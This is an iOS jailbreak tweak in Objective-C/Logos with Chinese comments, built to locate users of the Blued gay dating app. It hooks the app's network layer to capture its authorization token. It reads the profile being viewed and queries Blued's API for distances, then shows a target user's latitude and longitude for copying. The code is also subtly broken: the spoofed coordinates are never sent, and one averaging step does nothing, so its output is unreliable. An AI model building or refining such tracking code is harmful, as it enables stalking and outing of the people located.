// 标准头文件导入
#import <substrate.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 核心配置宏
#define TRACK_BTN_TAG 100001
#define EARTH_RADIUS_KM 111.32
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

// 全局静态变量（强引用按钮，防止被系统释放）
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;
static UIButton *g_trackButton = nil;

// ====================== UIViewController Hook（所有%new方法全部前置） ======================
%hook UIViewController

// ---------------------- 【1. 底层工具方法：最顶部，先定义】 ----------------------
%new
- (UIWindow *)trackHook_getSafeKeyWindow {
    UIWindow *keyWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                keyWindow = scene.windows.firstObject;
                break;
            }
        }
    }
    if (!keyWindow) {
        keyWindow = [UIApplication sharedApplication].keyWindow;
    }
    return keyWindow;
}

%new
- (UIViewController *)trackHook_getTopViewController {
    UIViewController *topVC = [self trackHook_getSafeKeyWindow].rootViewController;
    while (topVC.presentedViewController) {
        topVC = topVC.presentedViewController;
    }
    return topVC;
}

// ---------------------- 【2. UI工具方法：紧随底层工具】 ----------------------
%new
- (void)trackHook_showToast:(NSString *)message duration:(NSTimeInterval)duration {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self trackHook_getSafeKeyWindow];
        if (!window) return;
        
        for (UIView *subview in window.subviews) {
            if (subview.tag == 99999) [subview removeFromSuperview];
        }
        
        UILabel *toastLabel = [[UILabel alloc] initWithFrame:CGRectMake(0,0,300,100)];
        toastLabel.center = window.center;
        toastLabel.tag = 99999;
        toastLabel.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        toastLabel.textColor = UIColor.whiteColor;
        toastLabel.textAlignment = NSTextAlignmentCenter;
        toastLabel.numberOfLines = 0;
        toastLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
        toastLabel.text = message;
        toastLabel.layer.cornerRadius = 12;
        toastLabel.clipsToBounds = YES;
        toastLabel.layer.zPosition = 99999;
        
        [window addSubview:toastLabel];
        [UIView animateWithDuration:0.5 delay:duration options:0 animations:^{
            toastLabel.alpha = 0;
        } completion:^(BOOL finished) {
            [toastLabel removeFromSuperview];
        }];
    });
}

%new
- (void)trackHook_showResultWithSuccess:(BOOL)success message:(NSString *)message lat:(double)lat lng:(double)lng {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIViewController *topVC = [self trackHook_getTopViewController];
        if (!topVC) return;
        
        if (success) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🎯 定位成功" message:[NSString stringWithFormat:@"%@\n\n可直接复制坐标使用", message] preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
                UIPasteboard.generalPasteboard.string = [NSString stringWithFormat:@"%.8f, %.8f", lat, lng];
                [self trackHook_showToast:@"坐标已复制到剪贴板" duration:2.0];
            }]];
            [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [topVC presentViewController:alert animated:YES completion:nil];
        } else {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"⚠️ 定位失败" message:message preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
            [topVC presentViewController:alert animated:YES completion:nil];
        }
    });
}

// ---------------------- 【3. 业务逻辑方法：紧随UI工具】 ----------------------
%new
- (double)trackHook_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)fakeLat fakeLng:(double)fakeLng {
    NSString *urlString = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return -1.0;
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"GET";
    [request setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"Authorization"];
    [request setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"User-Agent"];
    request.timeoutInterval = 3.0;
    
    __block double resultDistance = -1.0;
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            NSError *jsonError = nil;
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError];
            if (!jsonError && json) {
                NSDictionary *userData = json[@"data"];
                if (userData && [userData[@"is_hide_distance"] intValue] == 0) {
                    resultDistance = [userData[@"distance"] doubleValue];
                }
            }
        }
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    return resultDistance;
}

%new
- (void)trackHook_autoFetchUserInfo {
    g_currentTargetUid = nil;
    g_initialDistance = -1.0;
    UIViewController *topVC = [self trackHook_getTopViewController];
    if (!topVC) return;
    
    unsigned int propertyCount = 0;
    objc_property_t *properties = class_copyPropertyList([topVC class], &propertyCount);
    for (int i = 0; i < propertyCount; i++) {
        objc_property_t property = properties[i];
        NSString *propertyName = [NSString stringWithUTF8String:property_getName(property)];
        @try {
            id userModel = [topVC valueForKey:propertyName];
            if (!userModel) continue;
            NSString *tempUid = [userModel valueForKey:@"uid"] ?: [userModel valueForKey:@"user_id"];
            if (tempUid && tempUid.length > 0) {
                g_currentTargetUid = tempUid;
                id distanceObj = [userModel valueForKey:@"distance"];
                if (distanceObj) {
                    if ([distanceObj isKindOfClass:[NSNumber class]]) {
                        g_initialDistance = [distanceObj doubleValue];
                    } else if ([distanceObj isKindOfClass:[NSString class]]) {
                        g_initialDistance = [distanceObj doubleValue];
                    }
                }
                break;
            }
        } @catch (NSException *exception) { continue; }
    }
    free(properties);
}

// ---------------------- 【4. 按钮交互方法：紧随业务逻辑】 ----------------------
%new
- (void)trackHook_dragButton:(UIPanGestureRecognizer *)pan {
    UIView *button = pan.view;
    UIWindow *window = [self trackHook_getSafeKeyWindow];
    if (!button || !window) return;
    
    CGPoint translation = [pan translationInView:window];
    button.center = CGPointMake(button.center.x + translation.x, button.center.y + translation.y);
    [pan setTranslation:CGPointZero inView:window];
    
    CGFloat margin = 10;
    CGRect frame = button.frame;
    frame.origin.x = MAX(margin, MIN(frame.origin.x, window.bounds.size.width - frame.size.width - margin));
    frame.origin.y = MAX(margin, MIN(frame.origin.y, window.bounds.size.height - frame.size.height - margin));
    button.frame = frame;
}

%new
- (void)trackHook_onButtonClick {
    [self trackHook_autoFetchUserInfo];
    
    if (!g_currentTargetUid || g_currentTargetUid.length == 0) {
        [self trackHook_showToast:@"❌ 请先打开目标用户的个人主页" duration:3.0];
        return;
    }
    if (g_initialDistance < 0) {
        [self trackHook_showToast:@"❌ 无法解析用户距离信息" duration:3.0];
        return;
    }
    if (g_initialDistance >= 9999.0 || g_initialDistance <= 0.0) {
        [self trackHook_showResultWithSuccess:NO message:[NSString stringWithFormat:@"目标开启了隐身，下发了无效距离 (%.2f)", g_initialDistance] lat:0.0 lng:0.0];
        return;
    }
    if (!g_bluedBasicToken || g_bluedBasicToken.length == 0) {
        [self trackHook_showToast:@"Token为空！请先刷一下附近的人页面再试" duration:4.0];
        return;
    }
    
    NSUserDefaults *bluedDefaults = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
    double initialLat = [bluedDefaults doubleForKey:@"current_latitude"] ?: [bluedDefaults doubleForKey:@"my_latitude"];
    double initialLng = [bluedDefaults doubleForKey:@"current_longitude"] ?: [bluedDefaults doubleForKey:@"my_longitude"];
    
    if (initialLat == 0 || initialLng == 0) {
        [self trackHook_showToast:@"无法获取当前坐标，请刷新附近的人页面" duration:3.0];
        return;
    }
    
    [self trackHook_showToast:[NSString stringWithFormat:@"雷达启动！\n原点距离: %.2fkm", g_initialDistance] duration:4.0];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        double currentLat = initialLat;
        double currentLng = initialLng;
        double currentDist = g_initialDistance;
        
        for (int i = 0; i < 8; i++) {
            double offsetLng = currentLng + (currentDist / (EARTH_RADIUS_KM * cos(currentLat * M_PI / 180.0)));
            double newDist = [self trackHook_fetchDistanceWithUid:g_currentTargetUid token:g_bluedBasicToken fakeLat:currentLat fakeLng:offsetLng];
            if (newDist < 0) break;
            
            currentLat = (currentLat + currentLat) / 2;
            currentLng = (currentLng + offsetLng) / 2;
            currentDist = (currentDist + newDist) / 2;
        }
        
        NSString *resultMsg = [NSString stringWithFormat:@"纬度：%.8f\n经度：%.8f", currentLat, currentLng];
        [self trackHook_showResultWithSuccess:YES message:resultMsg lat:currentLat lng:currentLng];
    });
}

// ---------------------- 【5. 按钮添加方法：紧随交互方法】 ----------------------
%new
- (void)trackHook_addFloatButton {
    UIWindow *keyWindow = [self trackHook_getSafeKeyWindow];
    if (!keyWindow || keyWindow.bounds.size.width == 0) return;
    if (g_trackButton || [keyWindow viewWithTag:TRACK_BTN_TAG]) return;
    
    CGFloat screenWidth = keyWindow.bounds.size.width;
    g_trackButton = [UIButton buttonWithType:UIButtonTypeCustom];
    g_trackButton.frame = CGRectMake(screenWidth - 150, 180, 130, 44);
    g_trackButton.tag = TRACK_BTN_TAG;
    g_trackButton.backgroundColor = [UIColor colorWithRed:0.91 green:0.12 blue:0.39 alpha:1.0];
    [g_trackButton setTitle:@"🛰️ 递归定位" forState:UIControlStateNormal];
    [g_trackButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    g_trackButton.titleLabel.font = [UIFont boldSystemFontOfSize:11];
    g_trackButton.layer.cornerRadius = 22;
    g_trackButton.layer.borderWidth = 2;
    g_trackButton.layer.borderColor = [UIColor whiteColor].CGColor;
    g_trackButton.clipsToBounds = YES;
    g_trackButton.layer.zPosition = 9999;
    
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(trackHook_dragButton:)];
    [g_trackButton addGestureRecognizer:pan];
    [g_trackButton addTarget:self action:@selector(trackHook_onButtonClick) forControlEvents:UIControlEventTouchUpInside];
    
    [keyWindow addSubview:g_trackButton];
    [keyWindow bringSubviewToFront:g_trackButton];
}

// ---------------------- 【6. 入口Hook：放在最后，调用所有前置方法】 ----------------------
- (void)viewDidAppear:(BOOL)animated {
    %orig(animated);
    dispatch_async(dispatch_get_main_queue(), ^{
        [self trackHook_addFloatButton];
    });
}

%end

// ====================== 全局Token抓取Hook ======================
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    NSDictionary *headers = request.allHTTPHeaderFields;
    NSString *authHeader = headers[@"Authorization"] ?: headers[@"authorization"];
    if (authHeader && [authHeader hasPrefix:@"Basic "]) {
        NSString *token = [authHeader substringFromIndex:6];
        if (token.length > 0 && ![g_bluedBasicToken isEqualToString:token]) {
            g_bluedBasicToken = token;
        }
    }
    return %orig(request, completionHandler);
}
%end
